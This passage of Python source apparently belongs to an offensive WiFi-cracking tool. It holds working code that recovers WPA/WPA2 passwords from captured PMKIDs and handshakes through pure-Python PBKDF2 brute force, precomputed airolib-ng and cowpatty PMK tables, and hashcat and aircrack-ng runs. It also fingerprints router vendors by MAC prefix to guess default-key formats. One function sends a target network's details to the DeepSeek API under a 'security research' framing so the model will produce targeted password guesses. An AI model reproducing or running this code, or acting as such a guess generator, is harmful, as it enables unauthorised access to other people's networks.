    Pure stdlib — no GPU, no OpenCL, no external tools.
    PMK  = PBKDF2-HMAC-SHA1(password, SSID, 4096, 32)
    PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || CLIENT_MAC)
    """
    import hashlib, hmac as _hmac
    passwords, entry = args
    ssid_raw = entry['ssid_raw']
    ap_mac   = entry['ap_mac']
    cl_mac   = entry['cl_mac']
    target   = entry['pmkid']
    data     = b'PMK Name' + ap_mac + cl_mac

    for pwd in passwords:
        try:
            pwd_b = pwd.encode('utf-8', errors='ignore') if isinstance(pwd, str) else pwd
            pmk   = hashlib.pbkdf2_hmac('sha1', pwd_b, ssid_raw, 4096, dklen=32)
            pmkid = _hmac.new(pmk, data, hashlib.sha1).digest()[:16]
            if pmkid == target:
                return pwd_b.decode('utf-8', errors='replace')
        except Exception:
            continue
    return None


def fingerprint_router(bssid, ssid):
    """
    Identify router manufacturer and ISP from BSSID OUI + SSID patterns.
    Returns an intel dict used to build the DeepSeek prompt.
    """
    intel = {
        'bssid': bssid, 'ssid': ssid,
        'manufacturer': 'Unknown', 'isp_hint': None,
        'ssid_patterns': [], 'default_key_format': None,
    }
    oui = bssid.replace(':', '').replace('-', '').upper()[:6]
    oui_map = {
        'BC9141': ('Zyxel',          'common ISP router'),
        'E84DD0': ('Zyxel',          'common ISP router'),
        '284E02': ('Swisscom',       'Centro Grande — key on label'),
        '8C843B': ('Swisscom',       'Centro Business'),
        'F4CF61': ('Fritzbox/AVM',   '16-char mixed alphanum printed on label'),
        'A02195': ('Fritzbox/AVM',   '16-char mixed alphanum printed on label'),
        '3C3786': ('Fritzbox/AVM',   '16-char mixed alphanum printed on label'),
        'B435B1': ('Sunrise CH',     '20-char alphanumeric default key'),
        'C4A35E': ('Sunrise CH',     '20-char alphanumeric default key'),
        '0006A4': ('Technicolor/UPC','8 uppercase letters + digits'),
        '708172': ('Technicolor/UPC','8 uppercase letters + digits'),
        '2014C2': ('Netgear',        '8-char default passphrase'),
        '1C5F2B': ('TP-Link',        'default key = last 8 of MAC address'),
        'F81A67': ('TP-Link',        'default key = last 8 of MAC address'),
        'E8DE27': ('TP-Link',        'default key = last 8 of MAC address'),
        'C46399': ('Asus',           'MAC-based default key'),
        '04D9F5': ('Asus',           'MAC-based default key'),
    }
    if oui in oui_map:
        intel['manufacturer'], intel['isp_hint'] = oui_map[oui]

    ssid_l = ssid.lower()
    pats   = []
    if re.search(r'swisscom|hispeed', ssid_l):
        pats.append('Swisscom CH router — default key on label')
        intel['isp_hint'] = 'Swisscom CH'
    if re.search(r'sunrise|yallo', ssid_l):
        pats.append('Sunrise CH — 20-char alphanumeric default')
        intel['isp_hint'] = 'Sunrise CH'
    if re.search(r'upc|cablecom', ssid_l):
        pats.append('UPC CH — 8 uppercase chars + digits')
        intel['isp_hint'] = 'UPC CH'
    if re.search(r'fritz', ssid_l):
        pats.append('Fritzbox — 16 random mixed-case alphanum on label')
        intel['default_key_format'] = '16-char mixed alphanum'
    if re.search(r'bt hub|bthub', ssid_l):
        pats.append('BT Hub UK — 10 lowercase chars on label')
    if re.search(r'sky[\d_]', ssid_l):
        pats.append('Sky UK — 8 uppercase default key')
    if re.search(r'vodafone', ssid_l):
        pats.append('Vodafone — 8-12 char mixed default')
    mac_suffix = bssid.replace(':', '')[-6:].upper()
    if mac_suffix.lower() in ssid_l or mac_suffix in ssid:
        pats.append(f'SSID contains MAC suffix {mac_suffix} — key may be MAC-derived')
    if re.search(r'[A-Z]{2,}\d{4,}', ssid):
        pats.append('SSID looks like serial/model number — key may be serial-derived')
    intel['ssid_patterns'] = pats
    return intel


AI_CONFIG_FILE = os.path.expanduser('~/.niixkey_ai.json')

def load_ai_config():
    """Load DeepSeek API key from ~/.niixkey_ai.json"""
    try:
        with open(AI_CONFIG_FILE) as f:
            return json.load(f)
    except Exception:
        return {}

def save_ai_config(cfg):
    """Persist DeepSeek API key to ~/.niixkey_ai.json"""
    try:
        with open(AI_CONFIG_FILE, 'w') as f:
            json.dump(cfg, f, indent=2)
        os.chmod(AI_CONFIG_FILE, 0o600)
    except Exception:
        pass

def get_deepseek_api_key():
    """
    Get DeepSeek API key — checks env var, saved config, then prompts user.
    Key is saved for future runs.
    """
    # 1. Environment variable
    key = os.environ.get('DEEPSEEK_API_KEY', '').strip()
    if key:
        return key
    # 2. Saved config
    cfg = load_ai_config()
    key = cfg.get('deepseek_api_key', '').strip()
    if key:
        return key
    # 3. Prompt user
    print()
    info(f"DeepSeek API key needed for AI-assisted cracking")
    info(f"Get a free key at  {c('https://platform.deepseek.com', C.BCYAN)}")
    info(f"Key will be saved to  {c(AI_CONFIG_FILE, C.DIM)}  for future runs")
    key = ask("DeepSeek API key (or press Enter to skip):").strip()
    if key:
        cfg['deepseek_api_key'] = key
        save_ai_config(cfg)
        ok("API key saved")
    return key


def generate_ai_candidates(bssid, ssid, intel, api_key, n=500):
    """
    Call DeepSeek API to generate a smart ordered list of password candidates.

    The AI is given everything we know about the target — SSID, BSSID, router
    manufacturer, ISP, and known default key patterns — and asked to produce the
    most likely passwords in priority order.

    This runs BEFORE rockyou so the most intelligent guesses hit first.
    Returns a list of password strings, or [] on failure.
    """
    import urllib.request, urllib.error

    prompt = f"""You are a WiFi security research assistant helping test password strength.

Target network information:
- SSID: {ssid}
- BSSID: {bssid}
- Router manufacturer: {intel['manufacturer']}
- ISP / device hint: {intel['isp_hint'] or 'Unknown'}
- SSID patterns detected: {', '.join(intel['ssid_patterns']) or 'none'}
- Known default key format: {intel['default_key_format'] or 'unknown'}

Your task: Generate a list of exactly {n} WiFi password candidates for this specific network, ordered from most likely to least likely.

Rules:
1. WPA2 passwords must be 8-63 characters
2. Prioritise patterns specific to the identified router/ISP
3. Include variations: common words + digits, capitalisation, l33t substitutions
4. If manufacturer is known, include format-specific guesses (e.g. 8-digit PINs for ISP routers)
5. Include BSSID-derived candidates (last 8 chars, reversed, etc.)
6. Include SSID-derived candidates (ssid+123, ssid+year, etc.)
7. Include common defaults for the identified manufacturer
8. Return ONLY the passwords, one per line, no numbering, no explanation
9. No duplicates

Generate the {n} candidates now:"""

    payload = json.dumps({
        'model':      'deepseek-chat',
        'messages':   [{'role': 'user', 'content': prompt}],
        'max_tokens': 4096,
        'temperature': 0.3,
        'stream':     False,
    }).encode()

    req = urllib.request.Request(
        'https://api.deepseek.com/chat/completions',
        data=payload,
        headers={
            'Content-Type':  'application/json',
            'Authorization': f'Bearer {api_key}',
        },
        method='POST'
    )

    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            data     = json.loads(resp.read().decode())
            content  = data['choices'][0]['message']['content']
            # Parse: one password per line, strip blank lines and list markers
            candidates = []
            for line in content.splitlines():
                pwd = re.sub(r'^\s*[\d]+[\.\)]\s*', '', line).strip()
                pwd = pwd.strip('"\'`')
                if 8 <= len(pwd) <= 63:
                    candidates.append(pwd)
            # Deduplicate preserving order
            seen = set()
            unique = []
            for p in candidates:
                if p not in seen:
                    seen.add(p)
                    unique.append(p)
            return unique
    except urllib.error.HTTPError as e:
        body = e.read().decode()[:200]
        warn(f"DeepSeek API error {e.code}: {body}")
        return []
    except Exception as e:
        warn(f"DeepSeek request failed: {e}")
        return []


def ai_crack_pmkid(entries, bssid, ssid):
    """
    AI-assisted PMKID cracking phase.

    1. Fingerprint the router from BSSID OUI + SSID patterns
    2. Ask DeepSeek to generate ~500 targeted password candidates
    3. Try them via the pure-Python PMKID verifier (fast — candidates are tiny)
    4. Show which candidate worked and why AI predicted it

    Returns cracked password or None.
    """
    import hashlib, hmac as _hmac, multiprocessing

    section("AI-Assisted Cracking  (DeepSeek)")
    info("Fingerprinting target router…")
    intel = fingerprint_router(bssid, ssid)

    # Display what we found
    print(f"  {c('Manufacturer:', C.DIM)}  {c(intel['manufacturer'], C.BWHITE)}")
    if intel['isp_hint']:
        print(f"  {c('ISP / hint:  ', C.DIM)}  {c(intel['isp_hint'], C.BYELLOW)}")
    for pat in intel['ssid_patterns']:
        print(f"  {c('Pattern:    ', C.DIM)}  {c(pat, C.DIM)}")
    print()

    api_key = get_deepseek_api_key()
    if not api_key:
        warn("No DeepSeek API key — skipping AI phase")
        return None

    info("Asking DeepSeek to generate targeted candidates…")
    candidates = generate_ai_candidates(bssid, ssid, intel, api_key, n=500)

    if not candidates:
        warn("DeepSeek returned no candidates")
        return None

    ok(f"DeepSeek generated {c(str(len(candidates)), C.BYELLOW, C.BOLD)} targeted candidates")
    info("Trying AI candidates via pure-Python PMKID verifier…")

    if not entries:
        warn("No PMKID entries to verify against")
        return None

    entry    = entries[0]
    ssid_raw = entry['ssid_raw']
    ap_mac   = entry['ap_mac']
    cl_mac   = entry['cl_mac']
    target   = entry['pmkid']
    data     = b'PMK Name' + ap_mac + cl_mac

    found = None
    for i, pwd in enumerate(candidates, 1):
        try:
            pwd_b = pwd.encode('utf-8', errors='ignore')
            pmk   = hashlib.pbkdf2_hmac('sha1', pwd_b, ssid_raw, 4096, dklen=32)
            pmkid = _hmac.new(pmk, data, hashlib.sha1).digest()[:16]
            print(f"\r  {c('▸', C.BCYAN)} Trying {i}/{len(candidates)}:  "
                  f"{c(pwd[:40], C.DIM)}   ", end='', flush=True)
            if pmkid == target:
                print()
                found = pwd
                break
        except Exception:
            continue

    print()

    if found:
        ok(f"AI candidate cracked it:  {c(found, C.BGREEN, C.BOLD)}")
        return found

    warn(f"AI candidates exhausted ({len(candidates)} tried) — not found")
    info("Proceeding to full wordlist cracking…")
    return None


def ai_crack_handshake(cap_file, bssid, ssid):
    """
    AI-assisted handshake cracking — same logic but uses aircrack-ng
    with a temp file of AI-generated candidates.
    Returns cracked password or None.
    """
    section("AI-Assisted Cracking  (DeepSeek)")
    info("Fingerprinting target router…")
    intel = fingerprint_router(bssid, ssid)

    print(f"  {c('Manufacturer:', C.DIM)}  {c(intel['manufacturer'], C.BWHITE)}")
    if intel['isp_hint']:
        print(f"  {c('ISP / hint:  ', C.DIM)}  {c(intel['isp_hint'], C.BYELLOW)}")
    for pat in intel['ssid_patterns']:
        print(f"  {c('Pattern:    ', C.DIM)}  {c(pat, C.DIM)}")
    print()

    api_key = get_deepseek_api_key()
    if not api_key:
        warn("No DeepSeek API key — skipping AI phase")
        return None

    info("Asking DeepSeek to generate targeted candidates…")
    candidates = generate_ai_candidates(bssid, ssid, intel, api_key, n=500)

    if not candidates:
        warn("DeepSeek returned no candidates")
        return None

    ok(f"DeepSeek generated {c(str(len(candidates)), C.BYELLOW, C.BOLD)} targeted candidates")

    # Write to temp wordlist and run aircrack-ng
    ai_wl = f'/tmp/niixkey_ai_{int(time.time())}.txt'
    with open(ai_wl, 'w') as f:
        f.write('\n'.join(candidates))

    info(f"Running aircrack-ng with AI wordlist…")
    divider()
    password = None
    try:
        proc = subprocess.Popen(
            ['aircrack-ng', '-a', '2', '-b', bssid, '-w', ai_wl, cap_file],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        for line in proc.stdout:
            s = line.strip()
            if 'KEY FOUND!' in s:
                m = re.search(r'\[\s*(.+?)\s*\]', s)
                if m:
                    password = m.group(1).strip()
                break
            elif any(k in s for k in ('Tested', '%', 'keys tested')):
                print(f"  {c(s, C.DIM)}", end='\r', flush=True)
        proc.wait()
        print()
    except Exception as e:
        warn(f"aircrack-ng AI attack error: {e}")
    divider()

    try:
        os.remove(ai_wl)
    except Exception:
        pass

    if password:
        ok(f"AI candidate cracked it:  {c(password, C.BGREEN, C.BOLD)}")
    else:
        warn("AI candidates didn't crack it — proceeding to full wordlist")
    return password


def crack_pmkid_pure_python(entries, wordlist_path):
    """
    Pure-Python multicore PMKID cracker using all available CPU cores.
    No GPU, no OpenCL, no hashcat required.
    Speed: ~5,000-15,000 candidates/sec/core (limited by PBKDF2-SHA1 by design).
    Returns cracked password or None.
    """
    import multiprocessing

    if not entries:
        warn("No PMKID entries to crack")
        return None

    entry   = entries[0]
    n_cores = max(1, multiprocessing.cpu_count())
    ok(f"Pure-Python PMKID cracker  *  {c(str(n_cores), C.BYELLOW, C.BOLD)} CPU cores  *  "
       f"SSID: {c(entry['ssid'], C.BWHITE)}")
    info("Each core tries ~5k-15k passwords/sec — rockyou.txt takes ~15-45 min on 4 cores")

    BATCH = 500

    def batches():
        batch = []
        try:
            with open(wordlist_path, 'r', errors='ignore') as fh:
                for line in fh:
                    pwd = line.rstrip('\n\r')
                    if 8 <= len(pwd) <= 63:
                        batch.append(pwd)
                        if len(batch) >= BATCH:
                            yield (batch, entry)
                            batch = []
            if batch:
                yield (batch, entry)
        except Exception as e:
            warn(f"Wordlist read error: {e}")

    total   = 0
    t_start = time.time()
    found   = None

    try:
        with multiprocessing.Pool(processes=n_cores) as pool:
            for result in pool.imap_unordered(_verify_pmkid_worker, batches(), chunksize=8):
                total += BATCH
                if result:
                    found = result
                    pool.terminate()
                    break
                if total % 10_000 == 0:
                    elapsed = time.time() - t_start
                    rate    = total / elapsed if elapsed > 0 else 0
                    print(f"\r  {c(chr(9654), C.BCYAN)}  Tested {c(str(total), C.BYELLOW)}  "
                          f"@ {c(f'{rate/1000:.1f}k', C.BWHITE)}/s  "
                          f"elapsed {c(f'{int(elapsed)}s', C.DIM)}   ",
                          end='', flush=True)
    except KeyboardInterrupt:
        print()
        warn("Pure-Python cracker interrupted by user")
        return None
    except Exception as e:
        warn(f"Cracker error: {e}")
        return None

    print()
    elapsed = time.time() - t_start
    rate    = total / elapsed if elapsed > 0 else 0
    info(f"Finished: tested {c(str(total), C.BYELLOW)} candidates "
         f"in {c(f'{elapsed:.1f}s', C.DIM)} ({c(f'{rate/1000:.1f}k/s', C.BWHITE)} avg)")
    return found


def get_pmk_db_path(ssid):
    """
    Return the airolib-ng database path for a given SSID.
    Stored at /opt/wordlists/pmk/<ssid_safe>.db
    """
    safe = re.sub(r'[^\w\-]', '_', ssid)[:50]
    db_dir = '/opt/wordlists/pmk'
    os.makedirs(db_dir, exist_ok=True)
    return os.path.join(db_dir, f'{safe}.db')


def get_cowpatty_table_path(ssid):
    """Return the cowpatty precomputed hash table path for a given SSID."""
    safe = re.sub(r'[^\w\-]', '_', ssid)[:50]
    tbl_dir = '/opt/wordlists/pmk'
    os.makedirs(tbl_dir, exist_ok=True)
    return os.path.join(tbl_dir, f'{safe}.cow')


def build_pmk_table(ssid, wordlist, method='auto'):
    """
    Precompute PMK table for the given SSID.

    Two backends:
      - airolib-ng  (aircrack-ng native db — fast, directly usable by aircrack-ng)
      - cowpatty --genpmk  (produces .cow file — used by cowpatty for lookup)

    The table is SSID-specific. Once built it can be reused for any network
    with the same SSID without re-deriving PMKs.

    Returns (method_used, output_path) or (None, None) on failure.
    """
    has_airolib  = check_tool('airolib-ng')
    has_cowpatty = check_tool('cowpatty')

    if method == 'auto':
        method = 'airolib' if has_airolib else ('cowpatty' if has_cowpatty else None)

    if not method:
        warn("Neither airolib-ng nor cowpatty found — cannot build PMK table")
        info("Install:  sudo apt-get install aircrack-ng cowpatty")
        return None, None

    if method == 'airolib':
        db_path = get_pmk_db_path(ssid)
        info(f"Building airolib-ng PMK database for SSID  {c(ssid, C.BWHITE)}…")
        info(f"Database:  {c(db_path, C.DIM)}")
        info("This is a one-time operation — reused on all future runs")

        # Import wordlist into airolib db
        try:
            r = subprocess.run(
                ['airolib-ng', db_path, '--import', 'passwd', wordlist],
                capture_output=True, text=True, timeout=60
            )
            if r.returncode != 0:
                warn(f"airolib-ng import failed: {r.stderr.strip()[:200]}")
                return None, None
        except Exception as e:
            warn(f"airolib-ng import error: {e}")
            return None, None

        # Set SSID
        try:
            r = subprocess.run(
                ['airolib-ng', db_path, '--import', 'essid', '-'],
                input=ssid + '\n', capture_output=True, text=True, timeout=30
            )
        except Exception:
            # Try writing ssid to temp file instead
            try:
                ssid_file = f'/tmp/niix_ssid_{int(time.time())}.txt'
                open(ssid_file, 'w').write(ssid + '\n')
                subprocess.run(['airolib-ng', db_path, '--import', 'essid', ssid_file],
                               capture_output=True, timeout=30)
                os.remove(ssid_file)
            except Exception as e2:
                warn(f"airolib-ng SSID import error: {e2}")

        # Compute PMKs
        info("Computing PMKs (this takes time proportional to wordlist size)…")
        try:
            pb = ProgressBar(0, label='Computing PMKs')
            pb.start()
            r = subprocess.run(
                ['airolib-ng', db_path, '--batch'],
                capture_output=True, text=True, timeout=86400  # up to 24h
            )
            pb.stop()
            if r.returncode == 0:
                ok(f"PMK database ready:  {c(db_path, C.BWHITE)}")
                return 'airolib', db_path
            else:
                pb.stop()
                warn(f"airolib-ng batch failed: {r.stderr.strip()[:200]}")
                return None, None
        except Exception as e:
            try: pb.stop()
            except Exception: pass
            warn(f"airolib-ng batch error: {e}")
            return None, None

    elif method == 'cowpatty':
        cow_path = get_cowpatty_table_path(ssid)
        info(f"Building cowpatty precomputed hash table for SSID  {c(ssid, C.BWHITE)}…")
        info(f"Output:  {c(cow_path, C.DIM)}")
        try:
            pb = ProgressBar(0, label='genpmk        ')
            pb.start()
            r = subprocess.run(
                ['genpmk', '-f', wordlist, '-d', cow_path, '-s', ssid],
                capture_output=True, text=True, timeout=86400
            )
            pb.stop()
            if os.path.exists(cow_path) and os.path.getsize(cow_path) > 0:
                ok(f"Cowpatty table ready:  {c(cow_path, C.BWHITE)}  "
                   f"({os.path.getsize(cow_path)//1024} KB)")
                return 'cowpatty', cow_path
            else:
                warn(f"genpmk failed: {r.stderr.strip()[:200]}")
                return None, None
        except Exception as e:
            try: pb.stop()
            except Exception: pass
            warn(f"genpmk error: {e}")
            return None, None

    return None, None


def crack_with_pmk_table(hash_file, ssid, bssid, cap_file=None):
    """
    Crack using a precomputed PMK table — instant lookup, no per-password PBKDF2.

    Lookup order:
      1. airolib-ng db  → aircrack-ng --airolib-ng  (works on .cap and hc22000)
      2. cowpatty .cow  → cowpatty -d               (works on .cap files)
      3. Pure-Python dict lookup against precomputed PMKs stored in db

    Returns cracked password or None.
    """
    db_path  = get_pmk_db_path(ssid)
    cow_path = get_cowpatty_table_path(ssid)

    # ── airolib-ng lookup ────────────────────────────────────────────
    if os.path.exists(db_path) and os.path.getsize(db_path) > 0 and cap_file:
        if check_tool('aircrack-ng'):
            info(f"PMK table found:  {c(db_path, C.BWHITE)}  "
                 f"({os.path.getsize(db_path)//1024} KB)")
            info("Running aircrack-ng with precomputed PMK database…")
            divider()
            try:
                proc = subprocess.Popen(
                    ['aircrack-ng', '-r', db_path, cap_file],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                )
                password = None
                for line in proc.stdout:
                    s = line.strip()
                    if 'KEY FOUND!' in s:
                        m = re.search(r'\[\s*(.+?)\s*\]', s)
                        if m:
                            password = m.group(1).strip()
                        break
                    elif s:
                        print(f"  {c(s, C.DIM)}", end='\r', flush=True)
                proc.wait()
                print()
                divider()
                if password:
                    ok(f"PMK table cracked:  {c(password, C.BGREEN, C.BOLD)}")
                    return password
                warn("airolib-ng: not in precomputed table")
            except Exception as e:
                warn(f"airolib-ng lookup error: {e}")

    # ── cowpatty lookup ──────────────────────────────────────────────
    if os.path.exists(cow_path) and os.path.getsize(cow_path) > 0 and cap_file:
        if check_tool('cowpatty'):
            info(f"Cowpatty table found:  {c(cow_path, C.BWHITE)}")
            info("Running cowpatty precomputed lookup…")
            divider()
            try:
                proc = subprocess.Popen(
                    ['cowpatty', '-d', cow_path, '-r', cap_file, '-s', ssid],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                )
                password = None
                for line in proc.stdout:
                    s = line.strip()
                    if 'The PSK is' in s or 'key found' in s.lower():
                        m = re.search(r'The PSK is\s+"?(.+?)"?\.?\s*$', s)
                        if m:
                            password = m.group(1).strip()
                        break
                    elif s:
                        print(f"  {c(s, C.DIM)}", end='\r', flush=True)
                proc.wait()
                print()
                divider()
                if password:
                    ok(f"Cowpatty cracked:  {c(password, C.BGREEN, C.BOLD)}")
                    return password
                warn("cowpatty: not in precomputed table")
            except Exception as e:
                warn(f"cowpatty error: {e}")

    # ── Pure-Python PMK lookup (hc22000 — no cap file needed) ────────
    # If we have a precomputed airolib db, we can extract stored PMK→password
    # mappings and do PMKID verification directly without re-running PBKDF2.
    # This is the "rainbow table equivalent" for WPA: O(1) lookup per candidate.
    if os.path.exists(db_path) and os.path.getsize(db_path) > 0:
        try:
            import sqlite3
            entries = parse_hc22000(hash_file) if hash_file else []
            if entries:
                entry = entries[0]
                ap_mac   = entry['ap_mac']
                cl_mac   = entry['cl_mac']
                target   = entry['pmkid']
                data     = b'PMK Name' + ap_mac + cl_mac

                info("Scanning airolib PMK database for matching PMKID…")
                import hashlib, hmac as _hmac
                conn = sqlite3.connect(db_path)
                cur  = conn.cursor()
                try:
                    # airolib stores: pmk (blob), passwd (text)
                    cur.execute("SELECT passwd, pmk FROM pmk LIMIT 1")   # test schema
                    cur.execute("SELECT passwd, pmk FROM pmk")
                    found = None
                    checked = 0
                    for passwd, pmk_blob in cur:
                        if pmk_blob and len(pmk_blob) == 32:
                            pmkid = _hmac.new(pmk_blob, data, hashlib.sha1).digest()[:16]
                            if pmkid == target:
                                found = passwd
                                break
                        checked += 1
                        if checked % 50_000 == 0:
                            print(f"\r  Checked {c(str(checked), C.BYELLOW)} PMK entries…",
                                  end='', flush=True)
                    print()
                    conn.close()
                    if found:
                        ok(f"PMK database hit:  {c(found, C.BGREEN, C.BOLD)}")
                        return found
                    warn("No matching PMK in database")
                except sqlite3.OperationalError as e:
                    warn(f"airolib schema error (may be old format): {e}")
                    conn.close()
        except ImportError:
            pass
        except Exception as e:
            warn(f"PMK db lookup error: {e}")

    return None


def manage_rainbow_tables(ssid, wordlist):
    """
    Interactive menu to manage PMK/rainbow tables for a given SSID.
    Lets the user build, inspect, or delete precomputed tables.
    """
    db_path  = get_pmk_db_path(ssid)
    cow_path = get_cowpatty_table_path(ssid)

    section("PMK Rainbow Table Manager")
    info(f"SSID:  {c(ssid, C.BWHITE, C.BOLD)}")
    print()

    has_airolib  = os.path.exists(db_path) and os.path.getsize(db_path) > 0
    has_cowpatty = os.path.exists(cow_path) and os.path.getsize(cow_path) > 0

    print(f"  airolib-ng db:   ", end='')
    if has_airolib:
        print(f"{c('EXISTS', C.BGREEN)}  {c(db_path, C.DIM)}  "
              f"({os.path.getsize(db_path)//1024} KB)")
    else:
        print(f"{c('not built', C.DIM)}")

    print(f"  cowpatty table:  ", end='')
    if has_cowpatty:
        print(f"{c('EXISTS', C.BGREEN)}  {c(cow_path, C.DIM)}  "
              f"({os.path.getsize(cow_path)//1024} KB)")
    else:
        print(f"{c('not built', C.DIM)}")

    print()
    print(f"  {c('[1]', C.BYELLOW)} Build airolib-ng PMK database  (recommended — reusable by aircrack-ng)")
    print(f"  {c('[2]', C.BYELLOW)} Build cowpatty precomputed table  (alternative)")
    print(f"  {c('[3]', C.BYELLOW)} Build both")
    print(f"  {c('[4]', C.BYELLOW)} Delete existing tables for this SSID")
    print(f"  {c('[0]', C.DIM   )} Skip / back")
    print()

    choice = ask("Choice:").strip()

    if choice == '1':
        build_pmk_table(ssid, wordlist, method='airolib')
    elif choice == '2':
        build_pmk_table(ssid, wordlist, method='cowpatty')
    elif choice == '3':
        build_pmk_table(ssid, wordlist, method='airolib')
        build_pmk_table(ssid, wordlist, method='cowpatty')
    elif choice == '4':
        for p in [db_path, cow_path]:
            if os.path.exists(p):
                os.remove(p)
                ok(f"Deleted {p}")
    else:
        info("Skipping table management")


def crack_pmkid_hash(hash_file, bssid):
    """
    Crack a hc22000 PMKID hash using every available method in priority order:

    0. Precomputed PMK table lookup  — O(1) per entry, instant if table exists
       (airolib-ng db or cowpatty .cow, SSID-specific)
    1. Pure-Python multicore PBKDF2  — always works, no GPU needed
    2. hashcat -m 22000              — GPU-accelerated if OpenCL available
    3. aircrack-ng via hccapx        — last resort if pcapng still on disk
    """
    info(f"Cracking PMKID hash  {c(hash_file, C.BWHITE)}")

    wordlist = find_or_fetch_wordlist()
    info(f"Wordlist:  {c(wordlist, C.BWHITE)}")

    entries = parse_hc22000(hash_file)
    ssid    = entries[0]['ssid'] if entries else None

    if entries:
        info(f"Found {c(str(len(entries)), C.BYELLOW)} PMKID entry/entries  ·  "
             f"SSID: {c(ssid, C.BWHITE)}")
    else:
        warn("No WPA*01 PMKID lines found — file may only contain EAPOL (WPA*02)")

    def success(password, method):
        print()
        print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
        print(f"  {('CRACKED via ' + method).center(60)}")
        print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
        print()
        print(f"  {c('Network ', C.DIM)}{c(bssid, C.BCYAN, C.BOLD)}")
        print(f"  {c('Password', C.DIM)} {c(password, C.BGREEN, C.BOLD)}")
        print()
        return password

    # ── Method 0: AI-assisted (DeepSeek) — targeted candidates first ─
    if entries and ssid:
        password = ai_crack_pmkid(entries, bssid, ssid)
        if password:
            return success(password, 'DeepSeek AI')

    # ── Method 1: Precomputed PMK table (instant lookup) ─────────────
    if ssid:
        db_path  = get_pmk_db_path(ssid)
        cow_path = get_cowpatty_table_path(ssid)
        has_table = (os.path.exists(db_path) and os.path.getsize(db_path) > 0) or \
                    (os.path.exists(cow_path) and os.path.getsize(cow_path) > 0)

        if has_table:
            section("PMK Table Lookup  (precomputed — instant)")
            password = crack_with_pmk_table(hash_file, ssid, bssid, cap_file=None)
            if password:
                return success(password, 'PMK Rainbow Table')
            warn("PMK table miss — password not in precomputed table")
        else:
            info(f"No PMK table for SSID  {c(ssid, C.BWHITE)}  — offer to build after cracking")
            resp = ask("Build PMK table in background while cracking continues? [y/N]")
            if resp.strip().lower() == 'y':
                def build_bg():
                    build_pmk_table(ssid, wordlist,
                                    method='airolib' if check_tool('airolib-ng') else 'cowpatty')
                threading.Thread(target=build_bg, daemon=True).start()
                info("Building PMK table in background…")

    # ── Method 2: Pure Python multicore ──────────────────────────────
    if entries:
        section("Pure-Python PMKID Cracker  (all CPU cores)")
        password = crack_pmkid_pure_python(entries, wordlist)
        if password:
            return success(password, 'Pure-Python PBKDF2')
        warn("Pure-Python cracker: password not in wordlist")

    # ── Method 3: hashcat (if OpenCL available) ───────────────────────
    if check_tool('hashcat') and hashcat_is_functional():
        info("Trying hashcat (GPU-accelerated)…")
        pot_file    = f'/tmp/niixkey_{int(time.time())}.pot'
        rules       = find_hashcat_rules()
        bundled_dir = get_bundled_rules_dir()
        if 'best64' not in rules:
            b = os.path.join(bundled_dir, 'best64.rule')
            if os.path.exists(b):
                rules['best64'] = b
        password = None
        si = lambda lbl: info(f"  hashcat: {c(lbl, C.BYELLOW)}")
        si("plain wordlist")
        password = run_hashcat_attack(hash_file, wordlist, pot_file, label='hc-plain')
        if not password and rules.get('best64'):
            si("best64 rules")
            password = run_hashcat_attack(hash_file, wordlist, pot_file,
                                          extra_args=['-r', rules['best64']], label='hc-best64')
        if not password:
            for mask in ['?d?d?d?d?d?d?d?d', '?d?d?d?d?d?d?d?d?d?d']:
                si(f"mask {mask}")
                password = run_hashcat_attack(hash_file, mask, pot_file,
                                              extra_args=['-a', '3'], label='hc-mask')
                if password:
                    break
        if password:
            return success(password, 'hashcat')
        warn("hashcat: password not found")

    # ── Method 4: aircrack-ng via pcapng conversion ───────────────────
    ts_part    = os.path.basename(hash_file).replace('pmkid_', '').replace('.hc22000', '')
    pcapng_tmp = f'/tmp/pmkid_{ts_part}.pcapng'
    if os.path.exists(pcapng_tmp) and os.path.getsize(pcapng_tmp) > 100:
        converter = next(
            (cv for cv in ['hcxpcapngtool', 'hcxpcaptool'] if check_tool(cv)), None
        )
        if converter:
            hccapx = pcapng_tmp.replace('.pcapng', '.hccapx')
            try:
                subprocess.run([converter, f'--hccapx={hccapx}', pcapng_tmp],
                               capture_output=True, timeout=15)
            except Exception as e:
                warn(f"hccapx conversion: {e}")
            if os.path.exists(hccapx) and os.path.getsize(hccapx) > 0:
                info("Running aircrack-ng on converted capture…")
                password = None
                try:
                    proc = subprocess.Popen(
                        ['aircrack-ng', '-w', wordlist, hccapx],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                    )
                    for line in proc.stdout:
                        s = line.strip()
                        if 'KEY FOUND!' in s:
                            m = re.search(r'\[\s*(.+?)\s*\]', s)
                            if m:
                                password = m.group(1).strip()
                            break
                        elif any(k in s for k in ('Tested', '%')):
                            print(f"  {c(s, C.DIM)}", end='\r', flush=True)
                    proc.wait()
                    print()
                except Exception as e:
                    warn(f"aircrack-ng error: {e}")
                if password:
                    return success(password, 'aircrack-ng')

    warn("All PMKID crack methods exhausted — password not in rockyou.txt")
    if ssid:
        info(f"Tip: build a PMK table for '{ssid}' — next crack will be instant")
    return None


def crack_wpa_password(capture_file, bssid):
    """
    Crack WPA/WPA2 4-way handshake.
    Converts the .cap to hc22000 then runs the same multi-stage hashcat
    attack as crack_pmkid_hash.  Falls back to aircrack-ng if hashcat
    or the converter is unavailable.
    """
    info(f"Starting dictionary attack on  {c(bssid, C.BCYAN)}")

    cap_files = [
        f for f in os.listdir('.')
        if f.startswith(capture_file) and f.endswith('.cap')
    ]
    if not cap_files:
        err("No capture files found")
        return None

    cap_file = sorted(cap_files)[0]
    info(f"Capture file:  {c(cap_file, C.BWHITE)}")

    # Try to extract SSID from cap filename for PMK table lookup
    # Filename pattern: handshake_<ssid>-01.cap
    ssid_guess = None
    m = re.match(r'handshake_(.+?)-\d+\.cap', os.path.basename(cap_file))
    if m:
        ssid_guess = m.group(1).replace('_', ' ').strip()

    wordlist = find_or_fetch_wordlist()
    info(f"Wordlist:  {c(wordlist, C.BWHITE)}")
    print()

    password = None

    # ── Method 0a: AI-assisted (DeepSeek) — targeted candidates first ─
    if ssid_guess:
        password = ai_crack_handshake(cap_file, bssid, ssid_guess)
        if password:
            print()
